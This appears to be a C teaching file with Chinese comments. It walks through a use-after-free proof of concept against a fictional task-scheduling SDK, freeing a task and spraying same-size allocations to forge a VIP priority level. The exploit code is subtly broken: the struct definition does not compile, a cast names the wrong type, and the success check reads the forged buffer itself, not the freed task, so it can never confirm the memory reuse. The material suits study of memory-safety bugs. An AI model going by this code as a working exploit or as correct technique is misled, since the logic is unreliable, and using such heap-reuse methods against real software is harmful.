//调用TaskRun SDK的API
#include "TaskRun.h"


//UAF 模拟攻击
//假设的攻击场景

/*
设想小明是一个初级页面仔，他要开发一个任务执行系统，
该系统根据任务的优先级顺序执行任务，
任务的优先级取决于用户的 VIP 等级，
该 VIP 等级被记录在 task 的 options 中
*/

//常规情况下，我们只能透过公共的 API 访问系统：

//POC
int main(int argc,char *argv[])
{
    //创建任务
    task_t task = create_secret_task();

    //读取options信息 ,获取VipLevel
    int VipLevel ;
    secret_get_options(task,SecretTaskOptVipLevel,&VipLevel);

    //获取优先级
    int priority = get_task_priority(task);

    //注销任务,导致UAF
    free_task(task); //task->options 内存被释放，但是指针没有清空，导致悬垂指针
}

//poc 尽量自己独立完成 并且思考，最后看公众号的答案
struct faked_secret_options {
    bool isVip;
    int vipLevel;
}
struct faked_secret_options *Payload = nullptr;
task_t paylaod_task = -1;

void poc()
{
    //由于 Task 默认是非 VIP 的，我们只能拿到最低优先级 INTMAX。这里我们通过 task->options 的 UAF 可以伪造 task 的 VIP 等级，方法如下：

    //① 创建一个 Task，并通过 free_task 函数将其释放，这会构造一个 task->options 的悬垂指针；
    //task_t task = create_secret_task();
    //free(task);

    //② 不断分配与 task->options 指向的struct secret_options相同大小的内存区域，直到task->options悬垂指针指向的区域被
    //   Reallocation成我们新申请的内存，验证方式可以伪造特定数据 ，随后通过secret_get_options来验证就行了。
    //申请一个区secret_options 相同大小的内存区域
    for (size_t i = 0; i < 1000; i++)
    {
        //①
        task_t task = create_secret_task();
        free(task);

        //申请payload的空间，和secret_options一样大
        struct faked_secret_options *fakeOptions = (struct fake_secret_options*)calloc(1,sizeof(faked_secret_options));
        //把VIP信息设置成true 来验证，是否成功
        fakeOptions->isVip = true;
        fakeOptions->vipLevel = 666666;

        //验证是否成功
        bool isVip;
        int vipLevel;
        secret_get_options(fakeOptions,SecretTaskOptIsVip,&isVip);
        secret_get_options(fakeOptions,SecretTaskOptVipLevel,&vipLevel);
        if(isVip || vipLevel == 666666)
        {
            printf("漏洞利用成功!\n");
            printf("payload加载成功!\n");
            printf("UAF 悬垂指针区域指向payload区域成功!\n");
            printf("\n");
            Payload = fakeOptions;
            paylaod_task = task;

        }
    }

    //③ 这时候struct secret_options 已经指向了我们新申请的区域，可以通过修改该区域来实现对 Task Options的修改

    //成功Pwn！
    Payload->isVip = true;
    paylaod_task = 2;
}